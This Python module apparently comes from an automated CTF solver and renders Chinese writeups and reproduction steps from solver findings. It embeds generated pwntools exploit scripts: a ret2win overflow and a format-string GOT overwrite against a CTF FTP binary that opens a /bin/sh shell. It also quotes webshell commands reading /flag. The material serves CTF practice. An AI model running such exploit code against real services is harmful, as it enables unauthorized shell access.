from __future__ import annotations

import re
from typing import Any

from forgeflag.domain import Challenge, Finding, Observation
from forgeflag.trace import shortest_trace_path, trace_steps_from_observations


class ReportBuilder:
    def build(
        self,
        challenge_id: str,
        accepted_flags: tuple[str, ...],
        findings: list[Finding],
        observations: list[Observation],
        challenge: Challenge | None = None,
    ) -> dict[str, Any]:
        solve_trace = trace_steps_from_observations(observations)
        flag_reports = [
            self._flag_report(flag, findings, observations, solve_trace)
            for flag in accepted_flags
        ]
        writeup = self._writeup_report(
            challenge_id,
            accepted_flags,
            flag_reports,
            findings,
            observations,
            challenge,
            solve_trace,
        )
        return {
            "challenge_id": challenge_id,
            "flags": flag_reports,
            "solve_trace": solve_trace,
            "writeup": writeup,
        }

    def _flag_report(
        self,
        flag: str,
        findings: list[Finding],
        observations: list[Observation],
        solve_trace: list[dict[str, Any]],
    ) -> dict[str, Any]:
        path = _dedupe_steps(
            [
                self._finding_step(finding)
                for finding in findings
                if flag in str(finding.evidence) or flag in finding.finding
            ],
            ("solver", "finding", "next_action"),
        )
        trace_path = shortest_trace_path(flag, solve_trace)
        related_observations = _dedupe_steps(
            [
                self._observation_step(observation)
                for observation in observations
                if flag in observation.summary or flag in str(observation.evidence)
            ],
            ("source", "kind", "summary"),
        )
        replay_steps = [
            step["next_action"]
            for step in path
            if step.get("next_action")
        ]
        return {
            "flag": flag,
            "path": path[:3],
            "trace_path": trace_path,
            "observations": related_observations[:3],
            "replay_steps": replay_steps[:3],
        }

    def _finding_step(self, finding: Finding) -> dict[str, Any]:
        return {
            "solver": finding.solver,
            "finding": finding.finding,
            "confidence": finding.confidence,
            "hypothesis": finding.hypothesis,
            "next_action": finding.next_action,
            "evidence": _compact_evidence(finding.evidence),
        }

    def _observation_step(self, observation: Observation) -> dict[str, Any]:
        return {
            "source": observation.source,
            "kind": observation.kind,
            "summary": observation.summary,
            "evidence": _compact_evidence(observation.evidence),
        }

    def _writeup_report(
        self,
        challenge_id: str,
        accepted_flags: tuple[str, ...],
        flag_reports: list[dict[str, Any]],
        findings: list[Finding],
        observations: list[Observation],
        challenge: Challenge | None,
        solve_trace: list[dict[str, Any]],
    ) -> dict[str, Any]:
        title = challenge.title if challenge and challenge.title else challenge_id
        category = challenge.category.value if challenge else "unknown"
        tags = list(challenge.tags) if challenge else []
        attachments = list(challenge.attachment_paths) if challenge else []
        path_steps = flag_reports[0]["path"] if flag_reports else []
        trace_path = flag_reports[0]["trace_path"] if flag_reports else solve_trace[:5]
        replay_steps = flag_reports[0]["replay_steps"] if flag_reports else []
        accepted_flag = accepted_flags[0] if accepted_flags else None
        pwn_exploit_plan = _first_pwn_exploit_plan(findings)
        if pwn_exploit_plan:
            reproduction_steps = _with_final_flag_step(
                _pwn_exploit_reproduction_steps(pwn_exploit_plan, attachments),
                accepted_flag,
            )
            approach_body = _pwn_exploit_approach_summary(pwn_exploit_plan)
            exploit_script = _pwn_exploit_script_doc(challenge_id, pwn_exploit_plan, attachments)
        else:
            reproduction_steps = _reproduction_steps(path_steps, trace_path, replay_steps, attachments, accepted_flag=accepted_flag)
            approach_body = _approach_summary(path_steps, findings)
            exploit_script = None

        sections = [
            {
                "title": "解题思路",
                "body": approach_body,
            },
            {
                "title": "复现步骤",
                "body": "照下面做即可复现获取 flag 的过程。",
                "steps": reproduction_steps,
            },
        ]
        markdown = _markdown_writeup(title, sections, exploit_script=exploit_script)
        report = {
            "kind": "ctf_writeup",
            "title": title,
            "challenge_id": challenge_id,
            "category": category,
            "tags": tags,
            "attachments": attachments,
            "final_flags": list(accepted_flags),
            "solve_trace": solve_trace,
            "shortest_discovery_path": trace_path,
            "sections": sections,
            "markdown": markdown,
        }
        if exploit_script:
            report["exploit_script"] = exploit_script
        return report


def _compact_evidence(evidence: dict[str, Any]) -> dict[str, Any]:
    compact: dict[str, Any] = {}
    for key, value in evidence.items():
        if isinstance(value, str):
            compact[key] = value[:500]
        elif isinstance(value, list):
            compact[key] = value[:10]
        elif isinstance(value, dict):
            compact[key] = {subkey: value[subkey] for subkey in list(value)[:10]}
        else:
            compact[key] = value
    return compact


def _non_empty_items(items: list[tuple[str, str | None]]) -> list[dict[str, str]]:
    return [{"label": label, "value": value} for label, value in items if value]


def _dedupe_steps(steps: list[dict[str, Any]], keys: tuple[str, ...]) -> list[dict[str, Any]]:
    seen: set[tuple[str, ...]] = set()
    deduped: list[dict[str, Any]] = []
    for step in reversed(steps):
        identity = tuple(str(step.get(key) or "") for key in keys)
        if identity in seen:
            continue
        seen.add(identity)
        deduped.append(step)
    return list(reversed(deduped))


def _approach_summary(path_steps: list[dict[str, Any]], findings: list[Finding]) -> str:
    antsword_recovery = _first_antsword_recovery(path_steps)
    if antsword_recovery:
        return "关键点是 AntSword/JSP webshell 流量：HTTP object 中一处记录了反向的 `cut -c N /flag` 命令，另一处记录了经过 ROT13 的逐字符回显；按位置重排即可还原 flag。"
    image_lsb = _first_image_lsb_recovery(path_steps)
    if image_lsb:
        recipe = image_lsb.get("recipe") or "LSB"
        return f"关键点是 PNG LSB 隐写：按 {recipe} 提取低位比特流，必要时再做文本解码，即可得到 flag。"
    reverse_strings = _first_reverse_strings_step(path_steps)
    if reverse_strings:
        return "关键点是二进制明文字符串泄露：先确认附件类型，再用 strings 提取可打印字符串，直接发现 flag。"
    random_xor = _first_nested(path_steps, "python_random_xor")
    if random_xor:
        return "关键点是弱随机种子：题目用小范围 seed 初始化 Python random，再生成 XOR key；遍历 seed 后即可还原明文。"
    rsa_recovery = _first_nested(path_steps, "rsa_recovery")
    if rsa_recovery:
        return "关键点是 RSA 参数足够恢复私钥或明文；利用已知因子/私钥参数计算明文后提取 flag。"
    if path_steps:
        solvers = " -> ".join(step.get("solver") or "solver" for step in path_steps)
        return f"最短有效路径由 {solvers} 完成：定位可疑线索，提取候选 flag，并交给 verifier 确认。"
    if findings:
        solvers = " -> ".join(dict.fromkeys(finding.solver for finding in findings))
        return f"本次运行记录了 {solvers} 的分析结果，但没有找到直接关联 flag 的最短证据路径。"
    return "暂无 solver 证据。"


def _conclusion_body(flags: list[str], challenge: Challenge | None) -> str:
    if flags:
        flag_text = ", ".join(flags)
        if challenge and challenge.description:
            return f"本题已确认 flag：{flag_text}。题面线索：{challenge.description}"
        return f"本题已确认 flag：{flag_text}。下面按可复现步骤整理从附件/线索到 flag 的过程。"
    if challenge and challenge.description:
        return f"本题尚未确认 flag。题面线索：{challenge.description}"
    return "本题尚未确认 flag。"


def _approach_items(path_steps: list[dict[str, Any]], trace_path: list[dict[str, Any]]) -> list[dict[str, str]]:
    items: list[dict[str, str]] = []
    for step in path_steps[:3]:
        items.append(
            {
                "label": step.get("solver") or "solver",
                "value": step.get("hypothesis") or step.get("finding") or "记录关键分析步骤。",
            }
        )
    if not items:
        for step in trace_path[:3]:
            items.append(
                {
                    "label": step.get("solver") or "solver",
                    "value": step.get("rationale") or step.get("summary") or "执行该 solver 并保留输出证据。",
                }
            )
    return items


def _evidence_items(path_steps: list[dict[str, Any]], observation_steps: list[dict[str, Any]]) -> list[dict[str, str]]:
    items: list[dict[str, str]] = []
    for step in path_steps:
        evidence = step.get("evidence") or {}
        items.extend(_human_evidence_items(step, evidence))
    if items:
        return items[:6]
    for observation in observation_steps:
        items.append(
            {
                "label": f"{observation.get('source') or 'observation'}: {observation.get('kind') or 'note'}",
                "value": observation.get("summary") or _short_text(observation.get("evidence") or {}),
            }
        )
    return items[:6]


def _human_evidence_items(step: dict[str, Any], evidence: dict[str, Any]) -> list[dict[str, str]]:
    reverse_strings = _reverse_strings_evidence(evidence)
    if reverse_strings:
        items = [
            ("附件", reverse_strings.get("artifact_name")),
            ("文件类型", reverse_strings.get("file_stdout")),
            ("strings 命中", reverse_strings.get("strings_stdout")),
            ("确认 flag", ", ".join(_string_list(evidence.get("flag_candidates")))),
        ]
        return [{"label": label, "value": str(value).strip()} for label, value in items if value not in (None, "")]
    random_xor = evidence.get("python_random_xor")
    if isinstance(random_xor, dict):
        items = [
            ("密文整数", random_xor.get("enc")),
            ("key 位数", random_xor.get("key_bits")),
            ("命中 seed", random_xor.get("seed")),
            ("还原明文", random_xor.get("plaintext_preview") or ", ".join(_string_list(random_xor.get("flags")))),
        ]
        return [{"label": label, "value": str(value)} for label, value in items if value not in (None, "")]
    rsa_recovery = evidence.get("rsa_recovery")
    if isinstance(rsa_recovery, dict):
        items = [
            ("恢复方法", rsa_recovery.get("method")),
            ("恢复 flag", ", ".join(_string_list(rsa_recovery.get("flags")))),
        ]
        return [{"label": label, "value": str(value)} for label, value in items if value not in (None, "")]
    transform_candidates = evidence.get("transform_candidates")
    if isinstance(transform_candidates, list) and transform_candidates:
        first = transform_candidates[0] if isinstance(transform_candidates[0], dict) else {"value": transform_candidates[0]}
        return [
            {"label": "转换方法", "value": str(first.get("method") or step.get("finding") or "transform")},
            {"label": "候选结果", "value": str(first.get("value") or first)},
        ]
    image_stego = evidence.get("image_stego")
    if isinstance(image_stego, dict):
        items = _image_stego_evidence_items(image_stego)
        if items:
            return items
    return [
        {
            "label": f"{step.get('solver') or 'solver'}: {step.get('finding') or 'finding'}",
            "value": _short_text(evidence),
        }
    ]


def _reproduction_steps(
    path_steps: list[dict[str, Any]],
    trace_path: list[dict[str, Any]],
    replay_steps: list[str],
    attachments: list[str],
    accepted_flag: str | None = None,
) -> list[str]:
    reverse_strings = _first_reverse_strings_step(path_steps)
    if reverse_strings:
        filename = reverse_strings.get("artifact_name") or (_basename(attachments[0]) if attachments else "题目附件")
        file_output = reverse_strings.get("file_stdout")
        flag = _first_string(reverse_strings.get("flags")) or "flag 候选"
        return [
            f"进入附件所在目录，确认目标文件为 {filename}。",
            f"执行 `file {filename}`，输出显示：{file_output}。" if file_output else f"执行 `file {filename}` 确认文件类型。",
            f"执行 `strings -n 4 {filename}` 提取可打印字符串。",
            f"在 strings 输出中看到 `{flag}`，提交该 flag。",
        ]
    random_xor = _first_nested(path_steps, "python_random_xor")
    if random_xor:
        filename = _basename(attachments[0]) if attachments else "题目附件"
        key_bits = random_xor.get("key_bits") or "对应位数"
        seed = random_xor.get("seed")
        preview = random_xor.get("plaintext_preview") or _first_string(random_xor.get("flags")) or "flag 候选"
        return [
            f"打开附件 {filename}，确认它用小范围 seed 初始化 Python random，并用 getrandbits({key_bits}) 生成 XOR key。",
            "遍历 seed 取值范围，按相同逻辑执行 random.seed(seed) 和 random.getrandbits(150)。" if key_bits == 150 else f"遍历 seed 取值范围，按相同逻辑执行 random.seed(seed) 和 random.getrandbits({key_bits})。",
            "用 ciphertext XOR key 还原明文，并按 flag 格式筛选候选结果。",
            f"命中 seed={seed}，明文为 {preview}。" if seed is not None else f"得到明文 {preview}。",
        ]
    rsa_recovery = _first_nested(path_steps, "rsa_recovery")
    if rsa_recovery:
        method = rsa_recovery.get("method") or "RSA recovery"
        flags = _string_list(rsa_recovery.get("flags"))
        result = flags[0] if flags else "flag 候选"
        return [
            "从题目文本或附件中提取 RSA 参数 n/e/c 以及可用的 p/q/d 等信息。",
            f"使用 {method} 恢复私钥或直接计算明文整数。",
            "把明文整数转回 bytes，并按 flag 格式提取结果。",
            f"得到 {result}。",
        ]
    classical_recovery = _first_classical_recovery(path_steps, accepted_flag=accepted_flag)
    if classical_recovery:
        filename = _basename(attachments[0]) if attachments else "题目附件"
        method = classical_recovery.get("method") or "classical_crypto"
        key = classical_recovery.get("key")
        ciphertext = classical_recovery.get("ciphertext")
        preview = classical_recovery.get("plaintext_preview") or _first_string(classical_recovery.get("flags")) or accepted_flag or "flag 候选"
        return [
            f"打开附件 {filename}，读取题面文本和密文。",
            f"识别为 {method}；密文为 {ciphertext}。" if ciphertext else f"识别为 {method}。",
            f"使用 key={key} 解密密文。" if key else "按候选 key 或题面给出的 key 解密密文。",
            f"解密明文为 {preview}，提交该 flag。",
        ]
    followed_url = _first_followed_url(path_steps, accepted_flag=accepted_flag)
    if followed_url:
        flag = accepted_flag or "flag 候选"
        return [
            "访问题目给出的 Web 目标，查看页面源码和脚本引用。",
            f"发现同源脚本/API 路径并访问：{followed_url}。",
            f"响应中出现 {flag}，提交该 flag。",
        ]
    web_response = _first_web_response_flag(path_steps, accepted_flag=accepted_flag)
    if web_response:
        target = web_response.get("target") or "目标 URL"
        flag = web_response.get("flag") or accepted_flag or "flag 候选"
        source = web_response.get("source") or "响应内容"
        headers = web_response.get("headers") or ""
        steps = [
            f"确认题目允许主动探测后，执行 `curl -i {target}` 获取响应头和正文。",
        ]
        if headers:
            steps.append(f"检查响应头，重点查看 {headers}。")
        steps.extend(
            [
                f"在{source}中看到 {flag}。",
                f"提交 {flag}，verifier 验证通过。",
            ]
        )
        return steps
    transform_candidate = _first_transform_candidate(path_steps, accepted_flag=accepted_flag)
    if transform_candidate:
        filename = _basename(attachments[0]) if attachments else "题目附件"
        method = transform_candidate.get("method") or _recipe_text(transform_candidate.get("recipe"))
        value = str(transform_candidate.get("value") or "flag 候选")
        return [
            f"打开附件 {filename}，读取题面文本和文件内容。",
            _transform_reproduction_step(method),
            f"得到候选 {value}，交给 verifier 验证通过。",
        ]
    image_lsb = _first_image_lsb_recovery(path_steps, accepted_flag=accepted_flag)
    if image_lsb:
        filename = image_lsb.get("artifact_name") or (_basename(attachments[0]) if attachments else "题目附件")
        recipe = image_lsb.get("recipe") or "b1,rgb,xy"
        channel_order = str(image_lsb.get("channel_order") or "rgb").upper()
        bit_plane = image_lsb.get("bit_plane") or 1
        bit_order = image_lsb.get("bit_order") or "msb"
        decoders = _string_list(image_lsb.get("decoders"))
        flag = image_lsb.get("flag") or accepted_flag or "flag 候选"
        steps = [
            f"执行 `file {filename}` 确认附件是 PNG 图片。",
            f"按 recipe `{recipe}` 提取最低位：逐像素按行读取 {channel_order} 通道的第 {bit_plane} 个低位，并按 {bit_order} 字节顺序组装文本。",
        ]
        if decoders:
            steps.append(f"对提取文本执行 {' -> '.join(decoders)} 解码，得到 {flag}。")
        else:
            steps.append(f"提取出的文本中直接出现 {flag}。")
        steps.append(f"提交 {flag}，verifier 验证通过。")
        return steps
    image_idat = _first_image_idat_payload(path_steps)
    if image_idat:
        filename = _basename(attachments[0]) if attachments else "题目附件"
        chunk_index = image_idat.get("chunk_index")
        truncated = bool(image_idat.get("truncated_chunk"))
        text = image_idat.get("text_preview") or _first_string(image_idat.get("flag_like_strings")) or "flag 候选"
        flag = _first_string(image_idat.get("flag_like_strings")) or text
        abnormal = "，且该 chunk 存在截断/长度异常" if truncated else ""
        return [
            f"打开附件 {filename}，用 PNG chunk 解析工具检查结构。",
            f"发现额外的 IDAT chunk：chunk_index={chunk_index}{abnormal}。",
            f"将该 IDAT 数据按独立 zlib 流解压，得到文本 {text}。",
            f"提交 {flag}，verifier 验证通过。",
        ]
    archive_recovery = _first_archive_recovery(path_steps, accepted_flag=accepted_flag)
    if archive_recovery:
        filename = archive_recovery.get("artifact_name") or (_basename(attachments[0]) if attachments else "题目附件")
        entry_name = archive_recovery.get("entry_name") or "可疑文件"
        flag = archive_recovery.get("flag") or accepted_flag or "flag 候选"
        archive_kind = archive_recovery.get("kind") or "archive"
        if archive_kind == "zip":
            return [
                f"执行 `unzip -l {filename}` 查看压缩包目录，重点关注 {entry_name}。",
                f"执行 `unzip -p {filename} {entry_name}` 直接输出该条目内容。",
                f"内容中出现 {flag}，提交该 flag。",
            ]
        return [
            f"列出附件 {filename} 的归档目录，重点关注 {entry_name}。",
            f"解出或直接读取 {entry_name} 的文本内容。",
            f"内容中出现 {flag}，提交该 flag。",
        ]
    image_text = _first_image_text_chunk_recovery(path_steps, accepted_flag=accepted_flag)
    if image_text:
        filename = image_text.get("artifact_name") or (_basename(attachments[0]) if attachments else "题目附件")
        chunk_type = image_text.get("chunk_type") or "text"
        keyword = image_text.get("keyword") or "文本块"
        flag = image_text.get("flag") or accepted_flag or "flag 候选"
        return [
            f"执行 `file {filename}` 确认附件是 PNG 图片。",
            f"执行 `exiftool {filename}` 或使用 PNG chunk 查看工具检查文本块。",
            f"发现 {chunk_type}/{keyword} 文本块，其中包含 {flag}。",
            f"提交 {flag}，verifier 验证通过。",
        ]
    forensics_strings = _first_forensics_strings_recovery(path_steps, accepted_flag=accepted_flag)
    if forensics_strings:
        filename = forensics_strings.get("artifact_name") or (_basename(attachments[0]) if attachments else "题目附件")
        file_output = forensics_strings.get("file_output")
        flag = forensics_strings.get("flag") or accepted_flag or "flag 候选"
        steps = [
            f"进入附件目录，先执行 `file {filename}` 判断文件类型。",
        ]
        if file_output:
            steps.append(f"`file {filename}` 输出显示：{file_output}。")
        steps.extend(
            [
                f"执行 `strings -n 4 {filename}` 提取可打印字符串。",
                f"在 strings/元数据输出中看到 {flag}，提交该 flag。",
            ]
        )
        return steps
    pwn_banner = _first_pwn_tcp_banner(path_steps, accepted_flag=accepted_flag)
    if pwn_banner:
        target = pwn_banner.get("target") or "host port"
        command_target = target.replace(":", " ")
        flag = pwn_banner.get("flag") or accepted_flag or "flag 候选"
        transcript = pwn_banner.get("transcript")
        steps = [
            f"确认题目给出的远程服务目标为 {target}。",
            f"执行 `nc {command_target}` 连接服务并读取初始 banner。",
        ]
        if transcript:
            steps.append(f"服务回显内容包含：{transcript}。")
        steps.append(f"从 transcript 中提取 {flag}，提交该 flag。")
        return steps
    antsword_recovery = _first_antsword_recovery(path_steps, accepted_flag=accepted_flag)
    if antsword_recovery:
        filename = antsword_recovery.get("artifact_name") or (_basename(attachments[0]) if attachments else "题目附件")
        command_object = antsword_recovery.get("command_object") or "命令对象"
        output_object = antsword_recovery.get("output_object") or "输出对象"
        flag = antsword_recovery.get("flag") or accepted_flag or "flag 候选"
        method = antsword_recovery.get("method") or ""
        transform = "ROT13" if "rot13" in method.lower() else "原始字符"
        return [
            f"打开附件 {filename}，确认它是 HTTP/JSP webshell 相关 pcap/pcapng。",
            f"用 Wireshark 或 `tshark --export-objects http,<目录> -r {filename}` 导出 HTTP object。",
            f"查看 {command_object}，将内容反转后提取所有 `cut -c N /flag`，记录每次读取的字符位置 N。",
            f"查看 {output_object}，提取每行单字符回显；对这些字符做 {transform} 解码。",
            "按第 3 步的位置顺序把第 4 步得到的字符放回对应下标，拼出完整 flag。",
            f"得到 {flag}，提交该 flag。",
        ]
    traffic_pcap = _first_traffic_pcap_recovery(path_steps, accepted_flag=accepted_flag)
    if traffic_pcap:
        filename = traffic_pcap.get("artifact_name") or (_basename(attachments[0]) if attachments else "题目附件")
        stream_id = traffic_pcap.get("stream_id") or "0"
        flag = traffic_pcap.get("flag") or accepted_flag or "flag 候选"
        export_name = traffic_pcap.get("export_name")
        steps = [
            f"打开附件 {filename}，确认它是 pcap/pcapng 流量包。",
            f"先执行 `tshark -r {filename} -q -z follow,tcp,ascii,{stream_id}` 重组 TCP stream {stream_id}，等价过滤条件是 `tcp.stream eq {stream_id}`。",
        ]
        if export_name:
            steps.append(f"如为 HTTP 传输，可导出 HTTP object，重点查看导出对象 {export_name}。")
        steps.append(f"在重组内容或导出对象中看到 {flag}，提交该 flag。")
        return steps
    dns_exfil = _first_dns_exfil_recovery(path_steps, accepted_flag=accepted_flag)
    if dns_exfil:
        filename = dns_exfil.get("artifact_name") or (_basename(attachments[0]) if attachments else "题目附件")
        query = dns_exfil.get("query") or "DNS query"
        flag = dns_exfil.get("flag") or accepted_flag or "flag 候选"
        return [
            f"打开附件 {filename}，确认它是 DNS 流量相关 pcap/pcapng。",
            f"执行 `tshark -r {filename} -Y dns -T fields -e dns.qry.name` 提取查询域名。",
            f"发现可疑查询域名 {query}，去掉 exfil/test 等固定后缀并拼接前缀片段。",
            f"按 DNS exfil 常见的 base32/base64/hex 方式解码，得到 {flag}，提交该 flag。",
        ]
    if replay_steps:
        return _with_final_flag_step(replay_steps[:5], accepted_flag)
    trace_steps = _trace_replay_steps(trace_path)
    if trace_steps:
        return _with_final_flag_step(trace_steps[:5], accepted_flag)
    return _with_final_flag_step(_fallback_replay_steps(path_steps), accepted_flag)


def _with_final_flag_step(steps: list[str], accepted_flag: str | None = None) -> list[str]:
    if not accepted_flag or any(accepted_flag in step for step in steps):
        return steps
    return [*steps, f"提交 {accepted_flag}，verifier 验证通过。"]


def _first_pwn_exploit_plan(findings: list[Finding]) -> dict[str, Any]:
    for finding in reversed(findings):
        if finding.solver != "PwnSolver":
            continue
        evidence = finding.evidence
        if not isinstance(evidence, dict):
            continue
        plan = evidence.get("exploit_plan")
        if isinstance(plan, dict):
            workflow = str(plan.get("workflow") or evidence.get("workflow_guess") or "")
            if workflow:
                merged = dict(plan)
                merged.setdefault("workflow", workflow)
                return merged
        workflow_guess = evidence.get("workflow_guess")
        if workflow_guess:
            return {"workflow": str(workflow_guess)}
    return {}


def _pwn_exploit_approach_summary(plan: dict[str, Any]) -> str:
    workflow = plan.get("workflow")
    if workflow == "ftp_heap_format_string":
        return (
            "关键点是 FTP 风格文件管理逻辑中的格式化字符串漏洞：先利用 `get` 路径泄露 printf@got，"
            "计算 libc 基址和 system 地址，再用格式化字符串把 printf@got 改成 system，最后让程序打印 `/bin/sh` 进入 shell。"
        )
    return "关键点是把 pwn solver 给出的利用路线整理成可运行 exploit：先确认漏洞原语，再按本地/远程两种模式复现拿 shell。"


def _pwn_exploit_reproduction_steps(plan: dict[str, Any], attachments: list[str]) -> list[str]:
    binary = _basename(attachments[0]) if attachments else "challenge_binary"
    workflow = plan.get("workflow")
    if workflow == "ftp_heap_format_string":
        login_input = plan.get("login_input") or "rxraclhm"
        offset = plan.get("format_offset") or 7
        return [
            f"本地模式：把附件 {binary} 放在 exploit.py 同目录，执行 `python3 exploit.py --binary ./{binary}`。",
            "远程模式：把 HOST/PORT 改成题目给出的地址端口，或执行 `python3 exploit.py --remote --host <host> --port <port>`。",
            f"脚本先发送登录输入 `{login_input}`，进入 put/get 文件命令交互。",
            "上传泄露 payload：在内容开头放 `printf@got`，再用 `%8$.4s` 从栈参数读取 GOT 指针处的 4 字节地址。",
            "用泄露出的 printf 地址减去 libc 中 printf 偏移，得到 libc 基址，并计算 system 地址。",
            f"用 `fmtstr_payload({offset}, {{printf@got: system}}, write_size='short')` 分两次短写覆盖 printf@got。",
            "上传内容为 `/bin/sh` 的文件并执行 `get cmd`；此时原本的 printf(content) 已变成 system('/bin/sh')，脚本进入交互 shell。",
        ]
    if workflow == "ret2win":
        symbol = _ret2win_symbol_from_plan(plan)
        return [
            f"本地模式：把附件 {binary} 放在 exploit.py 同目录，先执行 `python3 exploit.py --binary ./{binary} --find-offset` 触发 cyclic crash；确认 offset 后执行 `python3 exploit.py --binary ./{binary} --offset <offset>`。",
            "远程模式：把 HOST/PORT 改成题目给出的地址端口，或执行 `python3 exploit.py --remote --host <host> --port <port> --offset <offset>`。",
            f"脚本会读取 ELF 符号 `{symbol}`，构造 padding + {symbol} 地址的 ret2win payload。",
            "payload 发送后进入 `io.interactive()`，用于拿 shell 或读取服务回显 flag。",
        ]
    return [
        f"本地模式：把附件 {binary} 放在 exploit.py 同目录，执行 `python3 exploit.py --binary ./{binary}`。",
        "远程模式：把 HOST/PORT 改成题目给出的地址端口，或执行 `python3 exploit.py --remote --host <host> --port <port>`。",
        "按脚本中的漏洞原语发送 payload，确认能稳定进入 `io.interactive()`。",
    ]


def _pwn_exploit_script_doc(
    challenge_id: str,
    plan: dict[str, Any],
    attachments: list[str],
) -> dict[str, str]:
    slug = _safe_filename_slug(challenge_id)
    return {
        "filename": f"exploit_{slug}.py",
        "language": "python",
        "content": _pwn_exploit_script(plan, attachments),
    }


def _pwn_exploit_script(plan: dict[str, Any], attachments: list[str]) -> str:
    workflow = plan.get("workflow")
    if workflow == "ftp_heap_format_string":
        return _ftp_heap_format_string_exploit_script(plan, attachments)
    if workflow == "ret2win":
        return _ret2win_exploit_script(plan, attachments)
    binary = _basename(attachments[0]) if attachments else "challenge_binary"
    return f"""#!/usr/bin/env python3
from pwn import *
import argparse


def parse_args():
    parser = argparse.ArgumentParser(description="ForgeFlag pwn exploit skeleton")
    parser.add_argument("--remote", action="store_true")
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=31337)
    parser.add_argument("--binary", default="./{binary}")
    return parser.parse_args()


def start(args):
    if args.remote:
        return remote(args.host, args.port)
    return process(args.binary)


def main():
    args = parse_args()
    io = start(args)
    # Fill in the payload from the PwnSolver evidence, then keep the shell open.
    io.interactive()


if __name__ == "__main__":
    main()
"""


def _ret2win_symbol_from_plan(plan: dict[str, Any]) -> str:
    symbol = str(plan.get("symbol") or "").strip()
    if symbol:
        return symbol
    template = str(plan.get("payload_template") or "")
    match = re.search(r"elf\.symbols\[['\"]([^'\"]+)['\"]\]", template)
    return match.group(1) if match else "win"


def _ret2win_exploit_script(plan: dict[str, Any], attachments: list[str]) -> str:
    binary = _basename(attachments[0]) if attachments else "challenge_binary"
    symbol = _ret2win_symbol_from_plan(plan)
    return f"""#!/usr/bin/env python3
from pwn import *
import argparse

WIN_SYMBOL = "{symbol}"
CYCLIC_LENGTH = 512


def parse_args():
    parser = argparse.ArgumentParser(description="ForgeFlag generated ret2win exploit")
    parser.add_argument("--remote", action="store_true")
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=31337)
    parser.add_argument("--binary", default="./{binary}")
    parser.add_argument("--offset", type=int, default=None, help="cyclic offset to saved return address")
    parser.add_argument("--find-offset", action="store_true", help="send cyclic(512), then inspect the crash/corefile")
    parser.add_argument("--bits", type=int, choices=(32, 64), default=0, help="override address width; default reads ELF class")
    parser.add_argument("--log-level", default="info")
    return parser.parse_args()


def start(args):
    if args.remote:
        return remote(args.host, args.port)
    return process(args.binary)


def pack_addr(value, args, elf):
    bits = args.bits or elf.elfclass
    return p32(value) if bits == 32 else p64(value)


def main():
    args = parse_args()
    context.binary = elf = ELF(args.binary, checksec=False)
    context.log_level = args.log_level

    io = start(args)
    if args.find_offset:
        io.sendline(cyclic(CYCLIC_LENGTH))
        log.info("sent cyclic(%d); inspect the crash with gdb/pwndbg and rerun with --offset", CYCLIC_LENGTH)
        io.interactive()
        return

    if args.offset is None:
        log.failure("missing --offset; run with --find-offset first, then compute cyclic_find(crash_value)")
        raise SystemExit(2)

    win_addr = elf.symbols["{symbol}"]
    log.success("using %s at %#x", WIN_SYMBOL, win_addr)
    payload = flat({{args.offset: pack_addr(win_addr, args, elf)}})
    io.sendline(payload)
    io.interactive()


if __name__ == "__main__":
    main()
"""


def _ftp_heap_format_string_exploit_script(plan: dict[str, Any], attachments: list[str]) -> str:
    binary = _basename(attachments[0]) if attachments else "2016-CCTF-pwn3"
    login_input = str(plan.get("login_input") or "rxraclhm")
    format_offset = int(plan.get("format_offset") or 7)
    return f"""#!/usr/bin/env python3
from pwn import *
import argparse

LOGIN_INPUT = b"{login_input}"
FMT_OFFSET = {format_offset}


def parse_args():
    parser = argparse.ArgumentParser(description="ForgeFlag generated exploit")
    parser.add_argument("--remote", action="store_true")
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=31337)
    parser.add_argument("--binary", default="./{binary}")
    parser.add_argument("--libc", default="", help="libc path; defaults to process libc lookup")
    return parser.parse_args()


def start(args):
    if args.remote:
        return remote(args.host, args.port)
    return process(args.binary)


def send_login(io):
    io.recvuntil(b"Name (ftp.hacker.server:Rainism):")
    io.sendline(LOGIN_INPUT)


def put_file(io, name, content):
    io.recvuntil(b"ftp>")
    io.sendline(b"put")
    io.recvuntil(b"please enter the name of the file you want to upload:")
    io.sendline(name)
    io.recvuntil(b"then, enter the content:")
    io.sendline(content)


def get_file(io, name):
    io.recvuntil(b"ftp>")
    io.sendline(b"get")
    io.recvuntil(b"enter the file name you want to get:")
    io.sendline(name)
    return io.recvuntil(b"ftp>", drop=False)


def leak_printf(io, elf):
    payload = b"AAAA" + p32(elf.got["printf"]) + b".%8$.4s.END"
    put_file(io, b"leak", payload)
    data = get_file(io, b"leak")
    marker = b"AAAA" + p32(elf.got["printf"]) + b"."
    if marker not in data:
        log.failure("leak marker not found; adjust the format argument index")
        raise SystemExit(1)
    leak = data.split(marker, 1)[1][:4]
    if len(leak) != 4:
        log.failure("short printf leak")
        raise SystemExit(1)
    return u32(leak)


def resolve_libc(args, printf_leak):
    if args.libc:
        libc = ELF(args.libc, checksec=False)
        libc.address = printf_leak - libc.symbols["printf"]
        return libc
    libc = ELF("/lib/i386-linux-gnu/libc.so.6", checksec=False)
    libc.address = printf_leak - libc.symbols["printf"]
    return libc


def main():
    args = parse_args()
    context.binary = elf = ELF(args.binary, checksec=False)
    context.log_level = "info"

    io = start(args)
    send_login(io)

    printf_leak = leak_printf(io, elf)
    log.success(f"printf leak: {{hex(printf_leak)}}")
    libc = resolve_libc(args, printf_leak)
    system_addr = libc.symbols["system"]
    log.success(f"libc base: {{hex(libc.address)}}")
    log.success(f"system: {{hex(system_addr)}}")

    overwrite = fmtstr_payload(FMT_OFFSET, {{elf.got["printf"]: system_addr}}, write_size="short")
    put_file(io, b"write", overwrite)
    get_file(io, b"write")

    put_file(io, b"cmd", b"/bin/sh")
    get_file(io, b"cmd")
    io.interactive()


if __name__ == "__main__":
    main()
"""


def _fallback_replay_steps(path_steps: list[dict[str, Any]]) -> list[str]:
    steps = []
    for step in path_steps:
        solver = step.get("solver") or "solver"
        finding = step.get("finding") or "finding"
        steps.append(f"复查 {solver} 的 {finding} 证据。")
    return steps[:5]


def _trace_replay_steps(trace_path: list[dict[str, Any]]) -> list[str]:
    steps = []
    for step in trace_path:
        index = step.get("step_index") or len(steps) + 1
        solver = step.get("solver") or "solver"
        rationale = step.get("rationale") or step.get("summary") or "记录分析步骤。"
        candidates = step.get("flag_candidates") or []
        suffix = f" 候选 flag: {', '.join(candidates)}。" if candidates else ""
        steps.append(f"{index}. {solver}: {rationale}{suffix}")
